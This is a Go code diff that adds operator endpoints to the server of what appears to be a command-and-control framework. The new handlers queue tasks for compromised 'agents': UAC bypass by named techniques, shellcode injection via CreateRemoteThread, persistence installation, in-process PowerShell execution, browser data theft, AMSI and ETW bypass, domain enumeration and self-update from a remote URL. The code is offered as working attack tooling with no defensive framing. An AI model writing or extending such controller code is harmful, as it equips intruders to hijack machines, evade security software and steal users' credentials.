@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/base64"
 	"fmt"
-	"html/template"
 	"io"
 	"log/slog"
 	"net/http"
@@ -39,16 +38,7 @@ func (s *Server) handleShellPage(c *gin.Context) {
 		data[k] = v
 	}
 
-	var contentBuf bytes.Buffer
-	if err := s.tmpl.ExecuteTemplate(&contentBuf, "shell_content", data); err != nil {
-		slog.Error("Failed to render shell content", "err", err)
-		c.String(http.StatusInternalServerError, "Template error")
-		return
-	}
-
-	data["Content"] = template.HTML(contentBuf.String())
-	c.Header("Content-Type", "text/html; charset=utf-8")
-	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
+	s.renderPage(c, "shell_content", data)
 }
 
 func (s *Server) handleSendCommand(c *gin.Context) {
@@ -491,6 +481,29 @@ func (s *Server) handleElevate(c *gin.Context) {
 	s.dispatchTask(c, task, "elevate", cmd)
 }
 
+func (s *Server) handleUACBypass(c *gin.Context) {
+	id := c.Param("id")
+	method := c.PostForm("method")
+	if method == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "method is required (eventvwr, fodhelper, computerdefaults, sdclt, cmstp)"})
+		return
+	}
+	payload := c.PostForm("payload")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	cmd := method + "|" + payload
+	task, err := s.createTask(id, "uac_bypass", cmd, "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create uac_bypass task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	slog.Info("UAC bypass requested", "agent", id, "method", method)
+	s.LogAuditRecord(c, "uac_bypass", "agent", id, "UAC bypass: "+method, true, nil)
+	s.dispatchTask(c, task, "uac_bypass", method)
+}
+
 func (s *Server) handleKillAV(c *gin.Context) {
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
@@ -597,6 +610,53 @@ func (s *Server) handleInject(c *gin.Context) {
 	s.dispatchTask(c, task, "inject", cmd)
 }
 
+func (s *Server) handleSpawn(c *gin.Context) {
+	id := c.Param("id")
+	target := c.PostForm("target")
+	if target == "" {
+		target = "rundll32.exe"
+	}
+	technique := c.PostForm("technique")
+	if technique == "" {
+		technique = "CreateRemoteThread"
+	}
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+
+	file, err := c.FormFile("shellcode")
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "shellcode file required"})
+		return
+	}
+	if file.Size > MaxUploadSize {
+		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("shellcode too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
+		return
+	}
+	f, err := file.Open()
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read shellcode"})
+		return
+	}
+	defer f.Close()
+	data, err := io.ReadAll(f)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read shellcode data"})
+		return
+	}
+	b64Data := base64.StdEncoding.EncodeToString(data)
+
+	cmd := target + "|" + technique + "|" + b64Data
+	task, err := s.createTask(id, "spawn", cmd, "", "", "", 0, 0)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	slog.Info("Spawn requested", "agent", id, "target", target, "tech", technique, "size", len(data))
+	s.LogAuditRecord(c, "spawn", "agent", id, fmt.Sprintf("Spawn: %s|%s (%d bytes shellcode)", target, technique, len(data)), true, nil)
+	s.dispatchTask(c, task, "spawn", fmt.Sprintf("%s|%s", target, technique))
+}
+
 func (s *Server) handleLateral(c *gin.Context) {
 	id := c.Param("id")
 	spec := c.PostForm("spec")
@@ -637,11 +697,65 @@ func (s *Server) handleSocks(c *gin.Context) {
 	s.dispatchTask(c, task, "socks", port)
 }
 
+// handleCancelTask cancels a pending or running task.
+// POST /agents/:id/tasks/:taskId/cancel
+func (s *Server) handleCancelTask(c *gin.Context) {
+	agentID := c.Param("id")
+	taskIDStr := c.Param("taskId")
+
+	if _, ok := s.getAgentOrFail(c, agentID); !ok {
+		return
+	}
+
+	var taskID uint
+	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task id"})
+		return
+	}
+
+	var task db.Task
+	if err := s.db.First(&task, taskID).Error; err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
+		return
+	}
+	if task.AgentID != agentID {
+		c.JSON(http.StatusForbidden, gin.H{"error": "task belongs to different agent"})
+		return
+	}
+
+	if task.Status != "pending" && task.Status != "running" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("task is %s, cannot cancel", task.Status)})
+		return
+	}
+
+	s.db.Model(&task).Updates(map[string]interface{}{
+		"status": "cancelled",
+		"error":  "cancelled by operator",
+	})
+
+	slog.Info("Task cancelled", "agent", agentID, "task", taskID, "type", task.Type)
+	s.LogAuditRecord(c, "cancel_task", "agent", agentID, fmt.Sprintf("Cancelled task #%d (%s)", taskID, task.Type), true, nil)
+	s.broadcastTaskUpdate(agentID, task)
+	c.JSON(http.StatusOK, gin.H{"success": true, "message": "Task cancelled"})
+}
+
 // handleRerunTask clones an existing task's parameters and creates a new pending task.
 // POST /agents/:id/task/:taskId/rerun
 func (s *Server) handleRerunTask(c *gin.Context) {
 	agentID := c.Param("id")
 	taskIDStr := c.Param("taskId")
+
+	role, _ := c.Get("user_role")
+	if role == "viewer" {
+		c.JSON(http.StatusForbidden, gin.H{"error": "viewers cannot rerun tasks"})
+		return
+	}
+	user, _ := c.Get("user")
+	username := fmt.Sprintf("%v", user)
+	if holder, ok := s.checkAgentLock(agentID, username); !ok {
+		c.JSON(http.StatusLocked, gin.H{"error": fmt.Sprintf("agent已被 %s 锁定", holder), "locked_by": holder})
+		return
+	}
 
 	if _, ok := s.getAgentOrFail(c, agentID); !ok {
 		return
@@ -782,7 +896,134 @@ func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
 	s.dispatchTask(c, task, "elevate_printnightmare", dllPath)
 }
 
+// ── Persistence Toolkit ──────────────────────────────────────────────────
+func (s *Server) handlePersistence(c *gin.Context) {
+	id := c.Param("id")
+	action := c.PostForm("action")
+	method := c.PostForm("method")
+	binaryPath := c.PostForm("binary_path")
+
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+
+	switch action {
+	case "add":
+		if method == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "method is required"})
+			return
+		}
+		cmd := method + "|" + binaryPath
+		task, err := s.createTask(id, "persistence_add", cmd, "", "", "", 0, 0)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+			return
+		}
+		slog.Info("Persistence add requested", "agent", id, "method", method)
+		s.LogAuditRecord(c, "persistence_add", "agent", id, "Persistence add: "+method, true, nil)
+		s.dispatchTask(c, task, "persistence_add", method)
+
+	case "list":
+		task, err := s.createTask(id, "persistence_list", "", "", "", "", 0, 0)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+			return
+		}
+		slog.Info("Persistence list requested", "agent", id)
+		s.LogAuditRecord(c, "persistence_list", "agent", id, "Persistence list", true, nil)
+		s.dispatchTask(c, task, "persistence_list", "list")
+
+	case "remove":
+		if method == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "method is required"})
+			return
+		}
+		cmd := method + "|" + binaryPath
+		task, err := s.createTask(id, "persistence_remove", cmd, "", "", "", 0, 0)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+			return
+		}
+		slog.Info("Persistence remove requested", "agent", id, "method", method)
+		s.LogAuditRecord(c, "persistence_remove", "agent", id, "Persistence remove: "+method, true, nil)
+		s.dispatchTask(c, task, "persistence_remove", method)
+
+	default:
+		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid action: must be add, list, or remove"})
+	}
+}
+
+// ── PowerPick: Execute PowerShell script in-process ───────────────────────
+func (s *Server) handlePowerPick(c *gin.Context) {
+	id := c.Param("id")
+	script := c.PostForm("script")
+	if script == "" {
+		script = c.PostForm("command")
+	}
+	if script == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "script is required"})
+		return
+	}
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+
+	b64Script := base64.StdEncoding.EncodeToString([]byte(script))
+	task, err := s.createTask(id, "powerpick", b64Script, "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create powerpick task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+
+	slog.Info("PowerPick requested", "agent", id, "script_len", len(script))
+	s.LogAuditRecord(c, "powerpick", "agent", id, fmt.Sprintf("PowerPick script (%d bytes)", len(script)), true, nil)
+	s.dispatchTask(c, task, "powerpick", fmt.Sprintf("PowerPick (%d bytes)", len(script)))
+}
+
+// ── Browser Data Theft ────────────────────────────────────────────────────
+func (s *Server) handleBrowserSteal(c *gin.Context) {
+	id := c.Param("id")
+	browser := c.PostForm("browser")
+	if browser == "" {
+		browser = "all"
+	}
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "browser_steal", browser, "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create browser_steal task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	slog.Info("Browser data theft requested", "agent", id, "browser", browser)
+	s.LogAuditRecord(c, "browser_steal", "agent", id, "Browser steal: "+browser, true, nil)
+	s.dispatchTask(c, task, "browser_steal", "Browser steal: "+browser)
+}
+
 // ── BOF: Upload and execute Beacon Object File ────────────────────────────
+func (s *Server) handleNetCommand(c *gin.Context) {
+	id := c.Param("id")
+	command := c.PostForm("command")
+	if command == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "command is required (e.g. view, group /domain, localgroup Administrators, user, accounts, share)"})
+		return
+	}
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "net", command, "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create net task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	slog.Info("Net command requested", "agent", id, "command", command)
+	s.LogAuditRecord(c, "net", "agent", id, "Net: "+command, true, nil)
+	s.dispatchTask(c, task, "net", "Net: "+command)
+}
+
 func (s *Server) handleBOF(c *gin.Context) {
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
@@ -820,4 +1061,61 @@ func (s *Server) handleBOF(c *gin.Context) {
 	slog.Info("BOF execution requested", "agent", id, "file", file.Filename, "size", len(data), "args", args)
 	s.LogAuditRecord(c, "bof", "agent", id, fmt.Sprintf("BOF: %s (%d bytes) args=%s", file.Filename, len(data), args), true, nil)
 	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": fmt.Sprintf("BOF %s dispatched", file.Filename)})
+}
+
+// ── AMSI/ETW Bypass ──────────────────────────────────────────────────────────
+
+func (s *Server) handleAMSIByPass(c *gin.Context) {
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "amsi_bypass", "", "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create amsi_bypass task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	slog.Info("AMSI bypass requested", "agent", id)
+	s.LogAuditRecord(c, "amsi_bypass", "agent", id, "AMSI bypass requested", true, nil)
+	s.dispatchTask(c, task, "amsi_bypass", "AMSI Bypass")
+}
+
+func (s *Server) handleETWByPass(c *gin.Context) {
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "etw_bypass", "", "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create etw_bypass task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	slog.Info("ETW bypass requested", "agent", id)
+	s.LogAuditRecord(c, "etw_bypass", "agent", id, "ETW bypass requested", true, nil)
+	s.dispatchTask(c, task, "etw_bypass", "ETW Bypass")
+}
+
+// ── Self-Update ───────────────────────────────────────────────────────────────
+
+func (s *Server) handleSelfUpdate(c *gin.Context) {
+	id := c.Param("id")
+	url := c.PostForm("url")
+	if url == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "download URL is required"})
+		return
+	}
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "self_update", url, "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create self_update task", "agent_id", id, "error", err)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		return
+	}
+	slog.Info("Self-update requested", "agent", id, "url", url)
+	s.LogAuditRecord(c, "self_update", "agent", id, "Self-update: "+url, true, nil)
+	s.dispatchTask(c, task, "self_update", "Self-Update ("+url+")")
 }
